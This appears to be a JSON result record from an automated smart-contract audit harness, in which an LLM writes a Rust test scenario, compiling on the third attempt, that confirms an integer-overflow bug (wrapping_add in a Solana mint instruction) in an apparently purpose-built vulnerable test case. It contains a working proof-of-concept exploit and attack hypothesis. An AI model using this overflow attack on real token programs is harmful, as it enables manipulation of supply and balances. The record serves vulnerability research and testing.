@@ -1,0 +1,168 @@
+{
+  "category": "MATH",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: total_supply wrapped around to a small value instead of overflowing",
+  "attempts_used": 3,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2473,
+        "completion_tokens": 626,
+        "latency_s": 3.68
+      },
+      "raw": "{\n  \"plan\": \"Inicializo a conta Ledger com total_supply = u64::MAX - 5 e user_balance = 0 via a instrucao initialize (baseline legitimo). Depois chamo mint com amount = 10, que somado ao total_supply ultrapassa u64::MAX e, com wrapping_add, faz o total_supply dar a volta para 4. O efeito medido e que o total_supply resultante e menor que o valor inicial (4 < u64::MAX - 5), demonstrando o wrap-around em vez de falha.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet ledger_key = Pubkey::new_unique();\\n\\nlet init_ix = env.anchor_ix(\\n    \\\"initialize\\\",\\n    &(u64::MAX - 5),\\n    &[\\n        AccountMeta::new(ledger_key, true),\\n        AccountMeta::new(authority, true),\\n        AccountMeta::new_readonly(solana_program::system_program::id(), false),\\n    ],\\n);\\n\\nlet (system_program_id, system_program_account) = system_program_account();\\n\\nlet init_accounts = vec![\\n    (ledger_key, empty_account()),\\n    (authority, wallet(1_000_000_000)),\\n    (system_program_id, system_program_account),\\n];\\n\\nlet baseline = env.baseline(\\\"initialize ledger with near-max supply\\\", &init_ix, &init_accounts);\\n\\nlet ledger_after_init = after(&baseline, &ledger_key).clone();\\n\\nlet mint_ix = env.anchor_ix(\\n    \\\"mint\\\",\\n    &(10u64),\\n    &[\\n        AccountMeta::new(ledger_key, false),\\n        AccountMeta::new_readonly(authority, true),\\n    ],\\n);\\n\\nlet mint_accounts = vec![\\n    (ledger_key, ledger_after_init),\\n    (authority, wallet(1_000_000_000)),\\n];\\n\\nlet r = env.attack(\\\"mint with amount causing u64 wrap-around\\\", &mint_ix, &mint_accounts);\\n\\nif r.program_result == ProgramResult::Success {\\n    let data = after(&r, &ledger_key).data();\\n    let total_supply = read_u64(data, 40);\\n    let user_balance = read_u64(data, 48);\\n    env.effect(\\n        \\\"total_supply wrapped around to a small value instead of overflowing\\\",\\n        total_supply == 4 && user_balance == 10,\\n    );\\n}\"\n}",
+      "plan": "Inicializo a conta Ledger com total_supply = u64::MAX - 5 e user_balance = 0 via a instrucao initialize (baseline legitimo). Depois chamo mint com amount = 10, que somado ao total_supply ultrapassa u64::MAX e, com wrapping_add, faz o total_supply dar a volta para 4. O efeito medido e que o total_supply resultante e menor que o valor inicial (4 < u64::MAX - 5), demonstrando o wrap-around em vez de falha.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet ledger_key = Pubkey::new_unique();\n\nlet init_ix = env.anchor_ix(\n    \"initialize\",\n    &(u64::MAX - 5),\n    &[\n        AccountMeta::new(ledger_key, true),\n        AccountMeta::new(authority, true),\n        AccountMeta::new_readonly(solana_program::system_program::id(), false),\n    ],\n);\n\nlet (system_program_id, system_program_account) = system_program_account();\n\nlet init_accounts = vec![\n    (ledger_key, empty_account()),\n    (authority, wallet(1_000_000_000)),\n    (system_program_id, system_program_account),\n];\n\nlet baseline = env.baseline(\"initialize ledger with near-max supply\", &init_ix, &init_accounts);\n\nlet ledger_after_init = after(&baseline, &ledger_key).clone();\n\nlet mint_ix = env.anchor_ix(\n    \"mint\",\n    &(10u64),\n    &[\n        AccountMeta::new(ledger_key, false),\n        AccountMeta::new_readonly(authority, true),\n    ],\n);\n\nlet mint_accounts = vec![\n    (ledger_key, ledger_after_init),\n    (authority, wallet(1_000_000_000)),\n];\n\nlet r = env.attack(\"mint with amount causing u64 wrap-around\", &mint_ix, &mint_accounts);\n\nif r.program_result == ProgramResult::Success {\n    let data = after(&r, &ledger_key).data();\n    let total_supply = read_u64(data, 40);\n    let user_balance = read_u64(data, 48);\n    env.effect(\n        \"total_supply wrapped around to a small value instead of overflowing\",\n        total_supply == 4 && user_balance == 10,\n    );\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0308]: mismatched types\n   --> tests/attempt.rs:15:9\n    |\n 12 |       let init_ix = env.anchor_ix(\n    |                         --------- arguments to this method are incorrect\n...\n 15 | /         &[\n 16 | |             AccountMeta::new(ledger_key, true),\n 17 | |             AccountMeta::new(authority, true),\n 18 | |             AccountMeta::new_readonly(solana_program::system_progra...\n 19 | |         ],\n    | |_________^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 3]`\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:37:9\n    |\n 34 |       let mint_ix = env.anchor_ix(\n    |                         --------- arguments to this method are incorrect\n...\n 37 | /         &[\n 38 | |             AccountMeta::new(ledger_key, false),\n 39 | |             AccountMeta::new_readonly(authority, true),\n 40 | |         ],\n    | |_________^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors",
+        "elapsed_s": 0.6
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:15:9\n    |\n 12 |       let init_ix = env.anchor_ix(\n    |                         --------- arguments to this method are incorrect\n...\n 15 | /         &[\n 16 | |             AccountMeta::new(ledger_key, true),\n 17 | |             AccountMeta::new(authority, true),\n 18 | |             AccountMeta::new_readonly(solana_program::system_progra...\n 19 | |         ],\n    | |_________^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 3]`\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:37:9\n    |\n 34 |       let mint_ix = env.anchor_ix(\n    |                         --------- arguments to this method are incorrect\n...\n 37 | /         &[\n 38 | |             AccountMeta::new(ledger_key, false),\n 39 | |             AccountMeta::new_readonly(authority, true),\n 40 | |         ],\n    | |_________^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3229,
+        "completion_tokens": 642,
+        "latency_s": 3.49
+      },
+      "raw": "{\"plan\": \"Inicializo o ledger com total_supply proximo de u64::MAX (u64::MAX - 5) via initialize, que e o uso legitimo e precisa ter sucesso. Depois chamo mint com amount=10, que somado ao total_supply ultrapassa u64::MAX e, por usar wrapping_add, da a volta para 4 em vez de falhar. O efeito medido e que total_supply resultou em 4 (valor pequeno) e user_balance em 10, demonstrando o wrap-around. Corrijo o erro de compilacao passando Vec<AccountMeta> em vez de array.\", \"scenario\": \"let authority = Pubkey::new_unique();\\nlet ledger_key = Pubkey::new_unique();\\n\\nlet init_ix = env.anchor_ix(\\n    \\\"initialize\\\",\\n    &(u64::MAX - 5),\\n    &vec![\\n        AccountMeta::new(ledger_key, true),\\n        AccountMeta::new(authority, true),\\n        AccountMeta::new_readonly(solana_program::system_program::id(), false),\\n    ],\\n);\\n\\nlet (system_program_id, system_program_account) = system_program_account();\\n\\nlet init_accounts = vec![\\n    (ledger_key, empty_account()),\\n    (authority, wallet(1_000_000_000)),\\n    (system_program_id, system_program_account),\\n];\\n\\nlet baseline = env.baseline(\\\"initialize ledger with near-max supply\\\", &init_ix, &init_accounts);\\n\\nlet ledger_after_init = after(&baseline, &ledger_key).clone();\\n\\nlet mint_ix = env.anchor_ix(\\n    \\\"mint\\\",\\n    &(10u64),\\n    &vec![\\n        AccountMeta::new(ledger_key, false),\\n        AccountMeta::new_readonly(authority, true),\\n    ],\\n);\\n\\nlet mint_accounts = vec![\\n    (ledger_key, ledger_after_init),\\n    (authority, wallet(1_000_000_000)),\\n];\\n\\nlet r = env.attack(\\\"mint with amount causing u64 wrap-around\\\", &mint_ix, &mint_accounts);\\n\\nif r.program_result == ProgramResult::Success {\\n    let data = after(&r, &ledger_key).data();\\n    let total_supply = read_u64(data, 40);\\n    let user_balance = read_u64(data, 48);\\n    env.effect(\\n        \\\"total_supply wrapped around to a small value instead of overflowing\\\",\\n        total_supply == 4 && user_balance == 10,\\n    );\\n}\"}",
+      "plan": "Inicializo o ledger com total_supply proximo de u64::MAX (u64::MAX - 5) via initialize, que e o uso legitimo e precisa ter sucesso. Depois chamo mint com amount=10, que somado ao total_supply ultrapassa u64::MAX e, por usar wrapping_add, da a volta para 4 em vez de falhar. O efeito medido e que total_supply resultou em 4 (valor pequeno) e user_balance em 10, demonstrando o wrap-around. Corrijo o erro de compilacao passando Vec<AccountMeta> em vez de array.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet ledger_key = Pubkey::new_unique();\n\nlet init_ix = env.anchor_ix(\n    \"initialize\",\n    &(u64::MAX - 5),\n    &vec![\n        AccountMeta::new(ledger_key, true),\n        AccountMeta::new(authority, true),\n        AccountMeta::new_readonly(solana_program::system_program::id(), false),\n    ],\n);\n\nlet (system_program_id, system_program_account) = system_program_account();\n\nlet init_accounts = vec![\n    (ledger_key, empty_account()),\n    (authority, wallet(1_000_000_000)),\n    (system_program_id, system_program_account),\n];\n\nlet baseline = env.baseline(\"initialize ledger with near-max supply\", &init_ix, &init_accounts);\n\nlet ledger_after_init = after(&baseline, &ledger_key).clone();\n\nlet mint_ix = env.anchor_ix(\n    \"mint\",\n    &(10u64),\n    &vec![\n        AccountMeta::new(ledger_key, false),\n        AccountMeta::new_readonly(authority, true),\n    ],\n);\n\nlet mint_accounts = vec![\n    (ledger_key, ledger_after_init),\n    (authority, wallet(1_000_000_000)),\n];\n\nlet r = env.attack(\"mint with amount causing u64 wrap-around\", &mint_ix, &mint_accounts);\n\nif r.program_result == ProgramResult::Success {\n    let data = after(&r, &ledger_key).data();\n    let total_supply = read_u64(data, 40);\n    let user_balance = read_u64(data, 48);\n    env.effect(\n        \"total_supply wrapped around to a small value instead of overflowing\",\n        total_supply == 4 && user_balance == 10,\n    );\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0308]: mismatched types\n   --> tests/attempt.rs:15:9\n    |\n 12 |       let init_ix = env.anchor_ix(\n    |                         --------- arguments to this method are incorrect\n...\n 15 | /         &vec![\n 16 | |             AccountMeta::new(ledger_key, true),\n 17 | |             AccountMeta::new(authority, true),\n 18 | |             AccountMeta::new_readonly(solana_program::system_progra...\n 19 | |         ],\n    | |_________^ expected `Vec<AccountMeta>`, found `&Vec<AccountMeta>`\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:37:9\n    |\n 34 |       let mint_ix = env.anchor_ix(\n    |                         --------- arguments to this method are incorrect\n...\n 37 | /         &vec![\n 38 | |             AccountMeta::new(ledger_key, false),\n 39 | |             AccountMeta::new_readonly(authority, true),\n 40 | |         ],\n    | |_________^ expected `Vec<AccountMeta>`, found `&Vec<AccountMeta>`\n    |\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors",
+        "elapsed_s": 0.8
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:15:9\n    |\n 12 |       let init_ix = env.anchor_ix(\n    |                         --------- arguments to this method are incorrect\n...\n 15 | /         &vec![\n 16 | |             AccountMeta::new(ledger_key, true),\n 17 | |             AccountMeta::new(authority, true),\n 18 | |             AccountMeta::new_readonly(solana_program::system_progra...\n 19 | |         ],\n    | |_________^ expected `Vec<AccountMeta>`, found `&Vec<AccountMeta>`\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:37:9\n    |\n 34 |       let mint_ix = env.anchor_ix(\n    |                         --------- arguments to this method are incorrect\n...\n 37 | /         &vec![\n 38 | |             AccountMeta::new(ledger_key, false),\n 39 | |             AccountMeta::new_readonly(authority, true),\n 40 | |         ],\n    | |_________^ expected `Vec<AccountMeta>`, found `&Vec<AccountMeta>`\n    |\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors"
+    },
+    {
+      "attempt": 3,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3233,
+        "completion_tokens": 608,
+        "latency_s": 3.32
+      },
+      "raw": "{\"plan\": \"Inicializo o ledger com total_supply proximo de u64::MAX (u64::MAX - 5) via a instrucao initialize, que serve de baseline legitimo. Depois chamo mint com amount=10, que somado ao saldo ultrapassa u64::MAX. O wrapping_add faz total_supply dar a volta para 4 e user_balance para 10, em vez de falhar com ArithmeticOverflow. O efeito mede esses valores apos o ataque.\", \"scenario\": \"let authority = Pubkey::new_unique();\\nlet ledger_key = Pubkey::new_unique();\\n\\nlet init_ix = env.anchor_ix(\\n    \\\"initialize\\\",\\n    &(u64::MAX - 5),\\n    vec![\\n        AccountMeta::new(ledger_key, true),\\n        AccountMeta::new(authority, true),\\n        AccountMeta::new_readonly(solana_program::system_program::id(), false),\\n    ],\\n);\\n\\nlet (system_program_id, system_program_account) = system_program_account();\\n\\nlet init_accounts = vec![\\n    (ledger_key, empty_account()),\\n    (authority, wallet(1_000_000_000)),\\n    (system_program_id, system_program_account),\\n];\\n\\nlet baseline = env.baseline(\\\"initialize ledger with near-max supply\\\", &init_ix, &init_accounts);\\n\\nlet ledger_after_init = after(&baseline, &ledger_key).clone();\\n\\nlet mint_ix = env.anchor_ix(\\n    \\\"mint\\\",\\n    &(10u64),\\n    vec![\\n        AccountMeta::new(ledger_key, false),\\n        AccountMeta::new_readonly(authority, true),\\n    ],\\n);\\n\\nlet mint_accounts = vec![\\n    (ledger_key, ledger_after_init),\\n    (authority, wallet(1_000_000_000)),\\n];\\n\\nlet r = env.attack(\\\"mint with amount causing u64 wrap-around\\\", &mint_ix, &mint_accounts);\\n\\nif r.program_result == ProgramResult::Success {\\n    let data = after(&r, &ledger_key).data();\\n    let total_supply = read_u64(data, 40);\\n    let user_balance = read_u64(data, 48);\\n    env.effect(\\n        \\\"total_supply wrapped around to a small value instead of overflowing\\\",\\n        total_supply == 4 && user_balance == 10,\\n    );\\n}\"}",
+      "plan": "Inicializo o ledger com total_supply proximo de u64::MAX (u64::MAX - 5) via a instrucao initialize, que serve de baseline legitimo. Depois chamo mint com amount=10, que somado ao saldo ultrapassa u64::MAX. O wrapping_add faz total_supply dar a volta para 4 e user_balance para 10, em vez de falhar com ArithmeticOverflow. O efeito mede esses valores apos o ataque.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet ledger_key = Pubkey::new_unique();\n\nlet init_ix = env.anchor_ix(\n    \"initialize\",\n    &(u64::MAX - 5),\n    vec![\n        AccountMeta::new(ledger_key, true),\n        AccountMeta::new(authority, true),\n        AccountMeta::new_readonly(solana_program::system_program::id(), false),\n    ],\n);\n\nlet (system_program_id, system_program_account) = system_program_account();\n\nlet init_accounts = vec![\n    (ledger_key, empty_account()),\n    (authority, wallet(1_000_000_000)),\n    (system_program_id, system_program_account),\n];\n\nlet baseline = env.baseline(\"initialize ledger with near-max supply\", &init_ix, &init_accounts);\n\nlet ledger_after_init = after(&baseline, &ledger_key).clone();\n\nlet mint_ix = env.anchor_ix(\n    \"mint\",\n    &(10u64),\n    vec![\n        AccountMeta::new(ledger_key, false),\n        AccountMeta::new_readonly(authority, true),\n    ],\n);\n\nlet mint_accounts = vec![\n    (ledger_key, ledger_after_init),\n    (authority, wallet(1_000_000_000)),\n];\n\nlet r = env.attack(\"mint with amount causing u64 wrap-around\", &mint_ix, &mint_accounts);\n\nif r.program_result == ProgramResult::Success {\n    let data = after(&r, &ledger_key).data();\n    let total_supply = read_u64(data, 40);\n    let user_balance = read_u64(data, 48);\n    env.effect(\n        \"total_supply wrapped around to a small value instead of overflowing\",\n        total_supply == 4 && user_balance == 10,\n    );\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "initialize ledger with near-max supply",
+            "result": "Success",
+            "compute_units": 5933,
+            "account_flags": "sw,sw,-r",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": "2b2915d5b4b05f200000000000000001000000000000000000000000000000000000000000000000faffffffffffffff0000000000000000"
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "11111111111111111111111111111111",
+                "signer": false,
+                "writable": false,
+                "owner": "NativeLoader1111111111111111111111111111111",
+                "data_len": 14,
+                "head": "73797374656d5f70",
+                "digest": "d8e11c483f20607a",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "mint with amount causing u64 wrap-around",
+            "result": "Success",
+            "compute_units": 2193,
+            "account_flags": "-w,sr",
+            "ix_head": "e4fde9e1f10fd3a0",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA",
+                "data_len": 56,
+                "head": "2b2915d5b4b05f20",
+                "digest": "b6d2a315a60e9aa2",
+                "post": "2b2915d5b4b05f20000000000000000100000000000000000000000000000000000000000000000004000000000000000a00000000000000"
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "total_supply wrapped around to a small value instead of overflowing",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA invoke [1]",
+          "Program 11111111111111111111111111111111 invoke [2]",
+          "Program 11111111111111111111111111111111 success",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA consumed 5933 of 1400000 compute units",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA success",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA invoke [1]",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA consumed 2193 of 1400000 compute units",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: total_supply wrapped around to a small value instead of overflowing"
+    }
+  ],
+  "case_id": "SSP-03-A-V1",
+  "static_finding": {
+    "category": "MATH",
+    "confidence": "high",
+    "evidence": "ledger.total_supply = ledger.total_supply.wrapping_add(amount);\nledger.user_balance = ledger.user_balance.wrapping_add(amount);",
+    "explanation": "A instrucao usa wrapping_add para atualizar total_supply e user_balance. wrapping_add descarta silenciosamente o overflow, fazendo os valores darem a volta (wrap around) em vez de falhar. Isso permite que um atacante cunhe uma quantidade que estoure u64 e reinicie os saldos para valores baixos, manipulando indevidamente os saldos. O enum ErrorCode define ArithmeticOverflow, mas ele nunca e usado, indicando que a checagem segura foi omitida.",
+    "attack_hypothesis": "Um atacante chama mint com amount proximo de u64::MAX (ou um valor que somado ao saldo atual ultrapasse u64::MAX). O wrapping_add faz total_supply e user_balance darem a volta para valores pequenos, permitindo manipular o suprimento e o saldo do usuario de forma indevida.",
+    "attack_hypothesis_note": ""
+  }
+}
